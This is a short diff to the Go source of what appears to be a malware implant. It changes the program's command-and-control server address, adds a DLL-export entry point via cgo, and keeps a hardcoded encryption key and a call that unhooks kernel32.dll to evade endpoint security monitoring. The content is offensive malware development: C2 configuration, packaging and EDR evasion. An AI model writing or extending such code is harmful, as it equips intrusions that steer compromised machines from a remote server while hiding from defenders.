@@ -1,5 +1,6 @@
 package main
 
+import "C"
 import (
 	"fmt"
 	"io"
@@ -12,7 +13,11 @@ import (
 
 // TODO: pad keys
 var KeyStr string = "J8wZ9G4kQn5M2t7xS1a3Fd6vH0uYlRzp" // must be 16, 24, 32 bytes
-var C2Host string = "https://cnx.infrastructureupdates.net"
+var C2Host string = "https://b1.aptlabs.net:1848"
+
+func Entry() {
+	main()
+}
 
 func main() {
 	evasion.UnHookDll(`c:\windows\system32\kernel32.dll`)
